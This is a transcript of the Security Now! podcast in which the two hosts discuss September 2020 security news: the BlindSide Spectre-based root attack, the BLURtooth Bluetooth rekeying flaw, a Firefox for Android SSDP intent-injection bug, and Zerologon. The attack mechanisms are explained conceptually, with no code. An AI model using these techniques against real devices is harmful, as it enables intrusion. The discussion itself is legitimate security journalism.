And then something still wasn't quite right, so Rasmus - remember Rasmus Vind is the terrific web developer who knows the XenForo system and PHP upside down and backwards.  He and I spent a bit of time yesterday using Signal to communicate, as we had a couple years ago when I was first working with him, to figure out what might need to be updated.  I had updated to the latest version of XenForo, and many plugins needed to be tweaked a little bit after that.  So his may need to be revisited, but I'm sure we'll have it working within another day or so.  So anyway, at that point I'll be getting back to the benchmark, get it finalized, get it packaged, and then be able to say to all of our listeners on this podcast, I've got something really cool for everybody to play with.



LEO:  Awesome.  Can't wait.  All right.  Let's talk about BLURtooth, blue whatever that is.



STEVE:  Okay.  So BlindSide first.  And these guys are going to be familiar to us.  A team consisting of five super sharp researchers at ETH Zurich, the Stevens Institute of Technology and the University of Amsterdam, including our old friend Professor Herbert Bos, has just managed to oh-so-cleverly leverage Spectre-style processor performance optimizations in such a way that, first, they bypass any attempts to mitigate the processor's Spectre-style vulnerabilities; and then, second, leverage those vulnerabilities to successfully perform a so-called BROP (B-R-O-P), which stands for Blind Return-Oriented Programming.  And this can be done in the face of the best KASLR (Kernel Address Space Layout Randomization) while completely suppressing any "wrong layout guess" crashes.



Okay, so let's back up a bit.  I'll explain what they've done because it's - when you see the video, it is this week's Security Now! video, a four-minute video showing their proof of concept, which they start on a Linux terminal.  And in four minutes it has root.  So now I have your attention.



LEO:  That's not good.



STEVE:  No.  Okay.  So let's back up a bit.  You'll see, in fact, you have the video onscreen.  They first do a "who am I," and they get some random username.  We'll see four minutes later, after their system is finished cranking, they do another "who am I," and you know who is the...



LEO:  Somebody else, huh.



STEVE:  Then logged in, yeah.  Okay.  So a previous work by researchers at Stanford University was titled "Hacking Blind."  And I've got a link to the abstract, or to their whole paper, but the abstract describes what "hacking blind" is.  They said:  "We show that it is possible to write remote stack buffer overflow exploits, without possessing a copy of the target binary or source code, against services that restart after a crash.  This makes it possible to hack proprietary closed binary services, or open source servers manually compiled and installed from source where the binary remains unknown to the attacker."



That's something that we've never really touched on before is that the return-oriented programming assumes that you absolutely know the system that you're attacking, meaning you know what the ends of the subroutines that you're attempting to leverage with your so-called "gadgets," you know what they are.  But that's only the case when you know what the binary is.  If you don't have an exact binary, you're stabbing in the dark.  And that's exactly the point.  That's what they meant by "hacking blind."



So they said:  "Traditional techniques are usually paired against a particular binary and distribution where the hacker knows the location of useful gadgets for Return-Oriented Programming.  Our Blind ROP (BROP) attack instead remotely finds enough ROP gadgets to perform a write system call and transfers the vulnerable binary over the network, after which an exploit can be completed using known techniques."  In other words, they're able to, by tolerating the fact that they're going to, like over and over and over, be crashing the service, because the service restarts - well, in fact I'm stepping on this.



They said:  "This is accomplished by leaking a single bit of information based on whether a process crashed or not when given a particular input string.  BROP requires a stack vulnerability and a service that restarts after a crash.  The attack works against modern 64-bit Linux with address space layout randomization (ASLR), no-execute page protection (NX) and stack canaries."  So a fully instrumented state-of-the-art attack.  And Leo, I see that it is just about to finish.



LEO:  Who am I?



STEVE:  Here we go.



LEO:  Who am I?  I am Root.  Ha ha ha.  Or Groot.



STEVE:  Oh, baby.



LEO:  Wow.  So they got root.



STEVE:  They got root.



LEO:  But that's really interesting because they don't know the binary, but they are able to do it by probing?  



STEVE:  Okay.  So that first work that I mentioned, the work that Stanford did, it required a service that would auto restart.



LEO:  Right.



STEVE:  So they were crashing it over and over and over.



LEO:  Oh, I get it.  I get it.



STEVE:  And each time, the one bit of information they obtained was did it crash or not.



LEO:  Right.



STEVE:  And so, okay.  So on the other hand, as we've often noted, when a system contains a vulnerability, attempts to exploit that vulnerability more often than not simply crash.  And in fact that's what fuzzers do; right?  They discover potentially weaponizable flaws by first crashing a system that should not be crashable.  Then humans examine the execution path that the fuzzing triggered to see whether it might be exploitable.  And as we know, one of the keys to spotting when a system might be under active attack is when the system's logs suddenly show that normally reliable processes are suddenly crashing and auto restarting for no obvious reason.  Yeah, it could be buggy code.



LEO:  Somebody's doing something.



STEVE:  Exactly.  But why would buggy code suddenly choose to start crashing?  It could be the result of someone attempting and repeatedly failing to guess at the location of a known vulnerable module in an OS kernel that employs KASLR, whose kernel modules are randomized to occupy a different location in RAM for each boot.  And that's of course done to specifically thwart this sort of hit-or-miss guessing attack.  You would rather have the system crash than let the guy gain root on your system.



Okay.  So with that background, what this team, the BlindSide guys have done, this team of five brilliant researchers, Herbert Bos among them, the guys that nailed the Rowhammer attacks years ago, what they've managed to do is to figure out a way of completely neutering that powerful and arguably vital protection provided by KASLR by leveraging - get this, Leo - a system's Intel processor Spectre optimizations to repeatedly probe for the location of a known kernel bug in memory without ever crashing the system.



LEO:  Uh-oh.



STEVE:  Uh-huh.



LEO:  Uh-oh.



STEVE:  That's what you just watched in that video.



LEO:  There was no crash.



STEVE:  You watched a zero crash probe for a known bug that they were then able to leverage to give themselves root, and nothing crashed.



LEO:  That's not good.



STEVE:  So their paper is titled "Speculative Probing:  Hacking Blind in the Spectre Era."  And the video, for those who don't know, grc.sc/784, the number of today's podcast, 784.  Https://grc.sc, for shortcut, /784.  That will bounce you to a YouTube video where you can see this happen for yourself.  And we've often quoted Bruce Schneier saying "Attacks never get weaker, they only get stronger."  Here, after about 21 months of awareness and exploration of Spectre, and what Spectre can do, they are now leveraging Spectre to perpetrate an extremely practical attack.  So, wow, yeah.



LEO:  How would they get it on the server, though?  That's the question.



STEVE:  That is true.  The Stanford attack was a remote attack that would cause crashes and then export the binary, which would then allow them to design a specific attack.  Here you would need to have code running on the server.  On the other hand, if it was a VM, the problem with Spectre is that it's a cross-process leakage.  So you could, for example, probe the hypervisor in order to penetrate its protections in order to gain that advantage.  So anyway, it just demonstrates that Spectre is no longer just like a lab curiosity for the academics.  Oh, and I forgot to mention the source for that is on GitHub.



LEO:  Oh, wow.  Okay.  Well, get to work.



STEVE:  Buckle up.



LEO:  Geez, Louise.



STEVE:  Yeah.  Uh-huh.



LEO:  Okay.  Well, I'm just going to put a padlock on my server, that's all there is to it, right there.



STEVE:  Secondly, we have completely different BLURtooth.  Here, they have four headlines:  "BLURtooth Vulnerability Lets Attackers Defeat Bluetooth Encryption"; "Bluetooth Bug Opens Devices to Man-in-the-Middle Attacks"; "BLURtooth Vulnerability Lets Attackers Overwrite Bluetooth Authentication Keys"; and, finally, "New Unpatched Bluetooth Flaw Lets Attackers Easily Target Nearby Devices."  Everybody gets the idea that we've got a problem with Bluetooth.



BLURtooth is the result of insufficiently strict requirements appearing in previous Bluetooth specifications, from 4.0 through 5.0.  Some tightening recommendations appeared in the minor 5.1 update, which was released in January of 2019, so a year and three quarters ago.  The problem is that it offered some weird additional features like direction finding for Bluetooth, which, you know, if you didn't need that, you just ignored it.  So 5.1 said, you know, we've decided some things should be tightened.  And by the way, here's a bunch of cool new tech.  But a lot of people just said, okay, we don't need that, and they stayed with 5.0.



So technically the mistake was in allowing for cross-transport keying of pairing associations.  And I'll explain what that means, of course.  Devices that support two different transports, specifically both Bluetooth Low Energy (BLE) and also the Basic Rate/Enhanced Data Rate, the so-called BR/EDR transport methods.  Devices that support both, that is, BLE and BR/EDR, are known as "dual-mode" devices.  And the earlier specs, as I said, allowed for those two differing transports to deliberately affect each other's pairing keys.  This was designed deliberately because in fact it even - that protocol even has its own name and abbreviation.  It's called Cross-Transport Key Derivation (CTKD). 



It turns out, as originally implemented, and as presently implemented by most dual-mode devices, it's not as secure as they thought it was.  CTKD pairing allows the devices to pair once using either transport method while generating both the BR/EDR and the BLE long-term keys, without needing to pair a second time.  So back when the committee was working on the Bluetooth protocols, they said, you know, why make them pair twice?  If the devices are dual-mode, and they're able to support both BLE and BR/EDR, let's just pair once.  And then we'll use this CTKD, this cross-transport keying mechanism, to pair the other side, the other mode.



So once again we get bitten by the desire for convenience because dual-mode devices using CTKD are able to overwrite the original long-term key or the link key in cases where that transport was enforcing a higher level of security.  Okay.  So for example, the Bluetooth spec introduced so-called "Just Works" pairing, right, for those instances where easy communications but less security is all that's needed.  So, for example, fitness trackers; maybe Bluetooth LE-enabled jewelry; devices used to track a pet tag; or other technologies where you're just not concerned with sensitive information, like a credit card or health data.  You're not dealing with content.  You're just dealing with, like, oh, you know, how far away has Rover or Toaster gone?  Or is Toaster being attacked by a chipmunk, or something worse, a raccoon?



Anyway, so this Just Works technology is part of Bluetooth LE.  Even when devices also support the deliberately far more secure BR/EDR pairing.  As we know, one of the security enforcements for pairing is requiring a time-limited human-triggered event or some out-of-band communication like where you use a PIN, which is not part of the wireless protocol, to enable high-security pairing.  But two separate security research groups both independently discovered that it's possible to leverage that simple, unsupervised, nonsecure offering, the so-called "Just Works" pairing, and use then the CTKD, the cross-transport key derivation to break into and insecurely rekey the secure transport side.  And that was never intended.



So that's a big whoopsie.  There's no doubt that there are places where this would be a problem.  The implementers of Bluetooth-connected systems might have deliberately implemented both transports under the entirely reasonable assumption, I mean, and it is so stated in the spec, that the two transports were cryptographically isolated from one another, as indeed they were intended to be.  So, for example, imagine that some industrial control system uses a one-time highly secure pairing to communicate with its controlling monitor system.  But as a convenience, it also allows for Just Works pairing to be used with any nearby smartphone for read-only passive monitoring.  That's an entirely reasonable architectural design decision.



But now, unfortunately, any of those nearby unauthorized smart phones which are able to pair over Just Works Bluetooth Low Energy, now have the means to intercept, rekey, and perform an active man-in-the-middle attack against the main control link that was assumed to be super secure.  So for those using Bluetooth features of versions 4.0 through 5.0, as I mentioned before, there was no push or rush to implement the tighter restrictions which were added in 5.1.  If 5.1's additional functional enhancements were not needed, then why bother, since 5.0 was assumed to be secure?



That all changed last week.  So we can expect to see a move to v5.1 on any dual-mode Bluetooth devices, you know, like all of our smartphones that also now offer BLE.  So as always the case, those Bluetooth devices that are not part of some actively maintained upgrade cycle like, gulp, maybe some process monitoring hardware which is no longer being maintained or dynamically updated, everything that is stopped at 5.0 will forever remain vulnerable to this newly revealed class of cross-transport attack.



And so what we are seeing is we are gradually creating a growing environment of long-term vulnerabilities that are more than likely never going to get fixed.  And you just have to think that there are state-level actors and agencies that are not missing a single one of these.  They are adding to a large and growing portfolio of ways to attack this, ways to attack that.  And these things are never going to get fixed.  So a bit of a brave new world that we are creating really as a consequence of the unfixable debris that we are leaving behind as we're continuing to better learn how to do these things as we move forward.  Unfortunately, we're depending upon the ability to fix our mistakes in the past, and that's a strictly time-limited ability.



LEO:  Well, as always, you've cheered me up immensely, yes.  BLURtooth and BlindSide.



STEVE:  Yup.  Well-named.



LEO:  That's Steve Gibson.  Yeah, yeah.  It makes for a good show title, anyway.  Steve Gibson is at GRC.com.  That's his website.  That's where you can find, of course, copies of this show, including 16Kb versions for the bandwidth-impaired, and full transcriptions so you can read along as you listen.  GRC.com.  While you're there, check out SpinRite, the world's finest hard drive maintenance and recovery utility, supports SSDs too, soon will support even more.  He's working on 6.1, and if you buy now you'll get a free copy of 6.1.  So this is a good time to pick up your copy of SpinRite at GRC.com.



He's @SGgrc on the Twitter, if you want to leave him comments.  Lisa and I both get email for you all the time.  And I just say, you know, every end of every show we tell you, you can tweet him, @SGgrc.  Or really old school, go to GRC.com/feedback, leave him a feedback form.  That's the easiest way to do it.  I don't know how to get a hold of Steve.  He lives in the Fortress of Solitude somewhere in Orange County.  I can't...



STEVE:  Getting work done, yup.



LEO:  He doesn't want to hear from anybody, I can guarantee you that.  He's got stuff to do, places to go, people to see, code to write.  Assembly code, at that.  You will find the show also at our website, TWiT.tv/sn.  There's a YouTube channel devoted to Security Now!.  I don't know what the exact URL is, but if you go to YouTube.com/twit we've got all the links there in the sidebar.  And of course the best thing to do is subscribe.  That way you'll get the podcast the minute it's available, and you could begin your collection of all 784.  Make sure you get the very rare upside-down printed #83 edition.  That's something.  Worth many millions of dollars.



We do the show every Tuesday, right after MacBreak Weekly, more or less 1:30 Pacific, 4:30 Eastern, 20:30 UTC.  You can watch us work live, unlike your local mailman.  We have a live feed of our efforts at TWiT.tv/live.  If you're watching that live stream or listening, there's a number of places you can push the button and get it.  You can also be in the chatroom at irc.twit.tv.  They're watching and listening live, too:  irc.twit.tv.  Steve, have a great safe week, and I'll see you next week right here on Security Now!.



STEVE:  Okay, buddy.  Bye.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#785

DATE:		September 22, 2020

TITLE:		Formal Verification

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-785.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we look at an important security update to Android for Firefox.  We bid a fond farewell to Firefox Send and Notes.  We look at the promise and growing popularity of the disastrously-named DuckDuckGo Internet search service.  We dig into what's behind last Friday's Emergency Directive 20-04 from the DHS/CISA.  We'll also take a look at the recent privacy and security improvements incorporated into Android 11 and iOS 14.  We have a bit of errata, closing-the-loop feedback, and SpinRite news.  Then we're going to take a look at the need for Formal Verification of our complex security protocols going forward in the context of another critical failure of a massively widespread system.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  Coming up, a new search alternative that has a very silly name.  We'll also talk about Zerologon, an extremely serious, maybe the most serious Windows exploit ever, and what to do to avoid it.  And then, finally, the issue of formal verification of protocols.  How can we make sure that our protocols are secure?  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now!, Episode 785, recorded Tuesday, September 22nd, 2020:  Formal Verification.



It's time for Security Now! - oh boy, oh boy, oh boy! - the show where we cover your security and privacy online with this man right here, Steven Gibson.  Steve is in a new location.



STEVE GIBSON:  Coming to our listeners from an alternate location.



LEO:  It's beautiful.	



STEVE:  Well, it's where I am when I'm not in my bear's lair.  I was working away on the podcast, watching you guys talking on MacBreak Weekly sort of in the background, just sort of keeping a background sense for where you were along the way.  As soon as it's time for everyone's favorite picks of the week I think, okay.  And so I was working actually on the main topic, which as a consequence gets a little short-changed this week because suddenly the audio stopped.



And I thought, oh, okay.  And I looked over, and I had the little spinning wheel on the player.  And then I looked over at my main bandwidth monitor, and it was all red.  And so then everything looked okay on the cable modem, but I thought, well.  And I waited for a while.  It didn't come back.  So I rebooted the cable modem.  It never reachieved sync at the very first of the five things that flashes.  It never even got resynced.  So I thought, oh, that's not good.  So I dug out a previous cable modem and also had to find its power supply.  That took a while.  Actually I found a power supply, but it was happy with it.  And so fired it up, and it also would not sync to the cable.  So I think we just had a local neighborhood outage.



Fortunately, as I mention from time to time, I now have an alternate location where I spend my evenings.  This is why I needed sync, some sort of a sync solution is to keep separate work environments synchronized.  So I thought, well, okay.  And I know you, Leo, when there have been brief interruptions of things, you're just, like, okay, whatever it takes, we'll be patient.



LEO:  Yup.



STEVE:  Make a podcast.



LEO:  That's life, yup.



STEVE:  And so anyway, so I grabbed my hook, line, and sinker.  I got my microphone.



LEO:  I can't believe you moved the microphone and everything.  That's impressive.



STEVE:  And the Focusrite, the headphones, everything's all set up.  And so we're going to have a podcast.  This one is titled "Formal Verification," only because I'm really having a problem with the maximum length of what I would like our titles to be.  But I thought, okay, let's just cut to the quick:  Formal Verification.  We have had another, in as many weeks, critical vulnerability discovered in Bluetooth Low Energy connections.  And it's a consequence of the fact that we're still not formally verifying our security protocols.  We've been talking about this recently, the idea that we now have the technology, and we have the academic maturity, to create representations of complex security protocols and actually simulate them before we ever implement them to make sure they do what we think they do.



Well, once again, that wasn't done.  And the problem was found through seven Purdue researchers basically building a formal model of Bluetooth LE and saying to this model, is anything broken?  And yeah, sure enough, and it's really bad.  So we'll talk about that, which I think is really interesting.  And this sort of continues this idea that we've had.  We've been talking about this in different contexts for the last few months because it keeps coming up.  And it's just no longer okay for these critical security protocols to just be thrown together ad hoc.



Anyway, there was an important security update to Android for Firefox.  And Leo, we're going to bid a fond farewell to Firefox Send and Notes.



LEO:  This is why we can't have nice things on the Internet.



STEVE:  That's exactly right.  We're also going to look at the promise and growing popularity of the - I just can't help but think this is disastrously named - DuckDuckGo.  I mean, how do you take anything serious that's called DuckDuckGo?  Luckily, it was shortened from Duck, Duck, Goose.



LEO:  Yeah, that's that old kids' game.  Did you ever play that?



STEVE:  Never played.  And anyway...



LEO:  Were you ever a kid?  I'm just curious.



STEVE:  I tried to skip that.  It was painful.  And I spent all my time in the library.



LEO:  No childhood, yeah, yeah.



STEVE:  Yeah, exactly.  So anyway, it's turning out to be enjoying at the moment exponential growth.  And unfortunately, in this era of COVID, everyone has learned what an exponent is, even if they didn't know before.



LEO:  Yeah.



STEVE:  So we're going to talk about that briefly.  Also we're going to dig into what's behind last Friday's Emergency Directive 20-04 from the DHS/CISA.  Then we'll take a look at the recent privacy and security improvements incorporated into Android 11 and iOS 14.  They've done some nice things.  And there's a bit of sort of some philosophy I want to apply to this.  We've got a bit of errata, some closing-the-loop feedback, a little SpinRite update, and then we're going to take a look at the growing need for formal verification of our complex security protocols going forward, in the context of, as I said, another critical failure in a massively widespread system, Bluetooth.



LEO:  Yeah.  That's actually a really good topic for this show.  If anybody could call for some sort of standards around these new technologies, it would be you.  I mean, we have the IEEE.  We have the IETF.  We have WWC.  We have these standards bodies.  I don't know how careful they are.  Well, anyway, we'll listen.  It'll be very interesting.



STEVE:  So, yeah.  They're great at creating standards.  The problem is they're just sort of writing it down and saying, "Hey, Joe."



LEO:  Yeah.  It's up to you to make sure it happens, yeah.



STEVE:  "Does this look good to you?"  And Joe says, "Yeah, it looks good to me."  No, I mean, these are not mistakes in the standard.  Okay, there's some weakness in the way the standard was written.  But it shouldn't have ever been published the way it is.  And these academicians were able to model that and say, oh, look, it doesn't work the way we think it does.



LEO:  Well, as usual, it's no surprise with Bluetooth, which has never worked the way it should.  As usual, a lot of stuff coming up.



STEVE:  So an important and interesting LAN attack bug was recently fixed in Firefox 79 for Android.  It only affects the Android version of Firefox, not the desktop version.  So it turns out that Firefox on mobile locates other devices on the same LAN to share or receive content.  An example might be sharing video streams with a Roku player, for example.  To accomplish this location need, Firefox uses the Simple Service Discovery Protocol, SSDP.  And if that sounds familiar to our listeners, it's because we've often spoken of it and its quite mixed-blessing capabilities, limitations, and security shortfalls.  Although it was normally intended to be a freestanding protocol, its adoption by the infamous Universal Plug and Play (UPnP) system moved it into the UPnP spec.



It's a simple, text-based protocol based on HTTP over UDP.  And the system uses LAN-wide multicast addressing.  This is part of the problem.  On an IPv4 LAN, for example, packets sent to port 1900, which is the UPnP SSDP port, addressed to 239.255.255.250 - that's a reserved IP address on Ethernet.  That's one of the multicast addresses, which means that everybody on the same LAN will hear it and pick it up.  It'll be received by all the devices.  So Firefox uses this SSDP to query all devices on a local network for anything that Firefox might be interested in sharing.  When a device is discovered, Firefox's SSDP component retrieves the location of an XML file where that discovered device's configuration is stored.



So Chris Moberly, an Australian security researcher working for GitLab, discovered that Android "intent commands" - and we'll get to that in a second - intent commands could be placed into this returned XML file, and that upon Firefox's retrieval of the file on Firefox for Android, those embedded intent commands would be executed.



LEO:  Oh, please.



STEVE:  I know.



LEO:  Sanitize your inputs, for crying out loud.  This is the oldest trick in the book.  Geez.



STEVE:  I know.  So I thought, okay, what's an intent?  Android developer page explains intents with the title "Sending the User to Another App," which does not sound good from a security standpoint.  The developer page says:  "One of Android's most important features is an app's ability to send the user to another app based on an action it would like to perform.  For example, if your app has the address of a business that you'd like to show on a map, you don't have to build an activity in your app that shows a map.  Instead, you can create a request to view the address using an 'intent.'  The Android system then starts the appropriate app that's able to show the address on a map."



LEO:  Apple has a similar scheme.  It's a URL-based scheme. 



STEVE:  Exactly.



LEO:  You do need that in a phone because you need inter-app communication.



STEVE:  Yeah, exactly.  And so, for example, in iOS it's the scheme of the URL that triggers whatever it is.  Well, for example, like mailto://.  Anyway, they said:  "As previously explained, you must use intents to navigate between activities in your own app."  So they're widespread, if that's what you use even internally.  And they said:  "You generally do so with an explicit intent, which defines the exact class name of the component you want to start.  However, when you want to have a separate app perform an action such as view a map, you would use an implicit intent."



Okay.  So it's probably not difficult for any of our listeners to figure out that Android intents are powerful, and not something we'd like a remote attacker to be able to cause our Firefox browser to execute at will.  But until Firefox for Android 79, that's exactly what was possible.  A hacker could, for example, walk into any environment with a large WiFi network, maybe an airport or a large mall.  That attacker would connect to the local WiFi, like everyone else has who's there, and begin spamming the network with SSDP packets advertising its own maliciously crafted XML file containing Android intents.  Any Android user using a Firefox browser prior to 79 - so again, time to make sure you've got the latest Firefox browser - it would pick up the XML file and issue those maliciously designed intents, that is, Firefox itself would do that, causing whatever the attacker wanted to be executed.



LEO:  Boy, that's nasty.



STEVE:  It is really nasty.



LEO:  Boy.



STEVE:  So now that Firefox for Android has been updated - and again, everyone make sure you're using it - the vulnerability's discoverer posted further details along with proof-of-concept code and videos.  Chris Moberly wrote on GitLab, on his page on GitLab, I've got the link in the show notes, he said:  "The SSDP engine in Firefox for Android 68.11.0 and below" - and I'm not sure why he's saying that here because what we're told is that you have to have 79.  So maybe they jumped from 68.11.0 directly to 79.  But you want to make sure you've got 79.  He says:  "...can be tricked into triggering Android intent URIs with zero user interaction.  This attack can be leveraged by attackers on the same WiFi network and manifests as applications on the target device suddenly launching, without the user's permission, and conducting activities directed by the intent."  As you said, Leo, yikes.



"The target simply has to have the Firefox application running on their phone.  They do not need to access any malicious websites or click any malicious links.  No attacker in the middle or malicious app installation is required.  They can simply be sipping coffee while on a caf's WiFi," he wrote, "and their device will start launching application URIs under the attacker's control."



He says:  "I discovered this bug while the newest version of Firefox Mobile 79 was being rolled out globally.  Google Play Store was still serving a vulnerable version at this time, but only for a short period.  I reported the issue directly to Mozilla, just to be safe.  They responded right away and were quite pleasant to work with, providing some good info on where exactly this bug came from.  They were able to confirm that the vulnerable functionality was not included in the newest version and opened some issues to ensure that the offending code would not later be reintroduced by mistake."



He says:  "If you find a Firefox bug, I definitely recommend sending it straight to them."  He said:  "The process is very easy, the team members are smart and friendly, and it's a good way to support a project that has helped shape the way we" - clearly he's a fan of Firefox - "shape the way we use the web."  He says:  "As long as you have app updates enabled and have recently connected to WiFi, you should have received the new version and are safe from exploitation.  You can verify this yourself by opening Firefox on your device, clicking the three dots next to the address bar, and navigating to Settings > About Firefox.  If your version is 79 or above, you're safe."



So anyway, really interesting.  I mean, an example of one of those things that you can imagine it's so easy to exploit.  That's one of the other things we're seeing a lot lately is when a proof of concept is provided, when it's simple to do, it really is the case that there's a stratification of hackers.  And things that are really difficult that require an elite hacker, they remain theoretical for a long time.  But, boy, if it's a matter of here's a proof of concept that Chris posted on GitLab, any script kiddie can now implement this and see if they get lucky with somebody who for some reason might not have the latest Firefox.



And speaking of Firefox and Mozilla, I was happy to hear Chris  talk about how open they were, and accessible and friendly, because we are losing Send and Notes.  As our listeners know, the encrypted file sending service was a favorite, Leo, of yours and mine.  So ever since that service was suddenly suspended due to rampant abuse, as we know, I've been checking back from time to time, keeping tabs on it.  And as I've mentioned several times before, I've wondered out loud whether something more might be going on, since how difficult could it be, especially for them, to add some stronger anti-abuse features, like requiring a verified email address rather than allowing the completely unauthenticated use which was what they were doing before.  Well, now the other shoe has dropped, and we know that not only is Send gone for good, but so is whatever Notes was.  Actually I had never heard of it.



LEO:  I hadn't, either.



STEVE:  But it turns out, yeah, it's an inter-Firefox note syncing service.  Apparently not that popular, unlike Send, which was launched back in March of 2019.  And of course Send became quite popular because it was one of the very few dead simple, easy to use, truly secure end-to-end encrypted and free large file sending solutions.  You and I, Leo, both used it because it was easy to send a file to someone.



LEO:  Yeah.



STEVE:  Unfortunately, it wasn't only legitimate users who found it handy.  It turns out that Send was initially taken offline after ZDNet reported that the service was being constantly abused by malware groups who also liked both its end-to-end encryption and the fact that incoming files originated from a Firefox.com domain, which was very legitimate-looking.  So actually malware guys were putting encrypted stuff on a remote server and then incorporating the link into their malware.  Once the malware got in, the malware would then download the encrypted payload onto the local machine using Firefox Send.  So, yikes.



And of course at the time Mozilla said that Send's shutdown would be temporary and promised a way to find and curb the service's abuse, its abuse by malware operators.  But after quite a bit more than a few weeks, things changed.  As we recently noted here, Mozilla laid off 250 employees as part of an effort to refocus their business on commercial products.  So most of the staff that was supposed to be working to reengineer Send is gone, and the ones who are still around are now working on commercial products, or at least products that have a potential commercial upside - Mozilla VPN, Firefox Monitor, and Firefox Private Network.  So we'll keep tabs on that.



But in the meantime, what was it, it was Filemail was the one I was using before, and I dropped it in favor of Send.  I guess I'll be going back to Filemail to fulfill that need.  There is a Windows desktop version of Filemail.  I think they have desktop instances for the various desktop platforms.  So you don't need to use it.  You can use a browser.  But it's a little more robust, they say, if you use their desktop app.



So, okay.  We've never talked about DuckDuckGo except maybe in passing.  And maybe I'm showing my age, but just naming something DuckDuckGo and then saying, oh, yeah, this is the privacy-protecting anti-tracking search engine, it's like, okay, are you guys serious, really?  DuckDuckGo?  But what brought it onto my radar is it's breaking records.  They had and recently reported that August was 2 billion searches, 4 million of their app extension installs, 65 million - and I really did appreciate this, they said "Guesstimated active users.  We really don't know because... privacy."



And I thought, well, that's good that they don't know how many estimated users they have.  They are going exponential.  And, okay.  So let's forgive them this DuckDuckGo.  I actually dug around a little bit, like wondering what does that name mean?  Where did it come from?  We know that Google came from Googolplex, right, a really, really, really, really big number.  So I thought, okay.  And as you noted, Leo, I skipped over my childhood as much as possible.



LEO:  Clearly, yes.



STEVE:  So what I learned, what didn't surprise me, DuckDuckGo is known, though I would argue not yet widely enough, which is why I knew it would be of interest.



LEO:  It's pretty widely known.  I think, for instance, if you go to Firefox and look for alternative search providers, along with Google there's DuckDuckGo.  And I think that's probably how it's mostly known is as a search provider.  But they've now really kind of expanded.  In fact, it's ironic because this morning on iOS Today I recommended the DuckDuckGo browser on iOS.  So they've really taken off.  I don't know if that's a good thing.  Usually it's a bad thing, to be honest. 



STEVE:  Yeah.  Well, okay.  So it was launched 12 years ago, in 2008, by a guy named Gabriel Weinberg, who is an MIT grad.  He had sold his previous operation, something called Opobox, to Classmates.com, for which he got $10 million in 2006.  And after that he thought, okay, what am I going to do?  He was juggling a few different concepts.  He had the idea of structured data, a Quora-style Q&A, and maybe programmatically combating search spam.  So in an interview he said:  "I started all these projects independently, and none of them really took off.  Then I thought, maybe if I put them all together, there might be an interesting experience there."



The result was DuckDuckGo, which he says is a search engine offering direct answers to people's queries.  And that's kind of interesting because I find that I often ask Google a question.  I don't just put in some search term keywords.  I'll just - I might as well just write it because I figure, maybe it's getting smart enough to actually listen, like all of our other voice assistants are.  So I'll just often frame my searches as a query.



Well, it turns out that's exactly what DuckDuckGo expects you to do, and it tries to provide what they call "Instant Answers" at the top of the page that results from you asking it a question, rather than merely delivering a list of links.  It does that, too, a little bit lower down.  But otherwise, after the Instant Answers, the links it gets, they result from syndicated third parties like Bing, Yelp, and Yahoo.  So I guess it's forwarding its queries, or it has a deal with them to, like, access their backend databases, whatever.  But it is a privacy shield.



Unlike Google, DuckDuckGo has no filter bubble policy.  And of course you and I, and I know you and Jeff and Stacey have talked about this idea that different people get different search engine results because the engine knows, it learns about us over time, which tends to create, you know, the idea is to get more relevant results.  Unfortunately, it kind of gets self-reinforcing results at some point.  DuckDuckGo can't because it doesn't track our browser, our search history, our device type, our IP address, our usage behavior, or anything.  Everyone receives the same results from the same search query.  And of course, as we know...



LEO:  I love that, by the way.  I use DuckDuckGo on Firefox.  It's a perfect combination, if you ask me.  I have for years.



STEVE:  Well, and I like the idea of getting non-colored results because they're not always what you want.



LEO:  Sorry, I didn't mean to interrupt.  I threw you off.  I apologize.



STEVE:  No, no, no.  It's completely okay.  There was something I stumbled upon that I was really amazed at.  And I can't see it here in my show notes.  I'm just frantically scanning for it.  It was really a cool - it was another way that we were being tracked that he mentioned that just startled me.  Anyway, Google, of course, not only knows who we are, but according to Alphabet's executive chairman, Eric Schmidt, he was quoted saying, "We know where you've been, and we can more or less know what you're thinking about."  Which, I mean, Google's now bragging about, despite their "Do no evil" motto.



Oh, here it is.  To which Gabriel Weinberg would reply:  "As long as you can tie searches together and you keep any shred of the information, any personal information that can tie things back to you," he says, "then I think it's not truly private."  And so I never found out anything satisfying about the name.  It's only that, as we mentioned before, it's actually a shortened version of Duck, Duck, Goose, which is some sort of kids' game.  And so...



LEO:  What is this "Hide and Seek" you people are talking about?



STEVE:  Indeed.



LEO:  You would like it, though.  Everybody sits in a circle.  And you tap the kids' heads, and you go "Duck, duck, duck, duck."  And the minute you say "goose," that kid now has to chase you, and you sit down.  It's like tag in a circle.  It's fun.



STEVE:  I'm really glad I missed it.  You know, there was some comment about, like, oh, people are going to start saying "Duck it," the way people say, "Oh, just go google it."  And I thought, no.  No one is going to start saying "Go duck it."



LEO:  No, not happening.  Maybe that was his plan.  Actually, that's interesting, yeah.  Maybe that was it.



STEVE:  Keep working on it, Gabriel.  You've got a ways to go.  So, okay.  Here we are on Tuesday, September 22nd, now two weeks downstream from this month's Patch Tuesday, which puts us six weeks down from August's Patch Tuesday.  And after last week's blistering summary of the need to apply this month's patches, I cannot imagine that anyone would not have done so by now, let alone last month's patches.  But Leo, difficult as it might be to believe, apparently not everyone listens to this podcast every week.



LEO:  What?



STEVE:  I know, I know, I know.  Some things just cannot be explained.  That's okay.  For those who are listening, here's what just happened.  After giving the world what should have been ample time to apply the August Windows updates, last Monday, a week ago and a day, Secura responsibly disclosed, they published a detailed behind-the-scenes description of just one of the nightmares that Microsoft fixed last month.  Not two weeks ago, six weeks ago.  Their blog posting begins - I have a link in the show notes to the whole one, for anyone who wants it.  They said:  "Last month, Microsoft patched a very interesting vulnerability that would allow an attacker with a foothold on your internal network to essentially become domain admin with one click."



LEO:  Ugh.



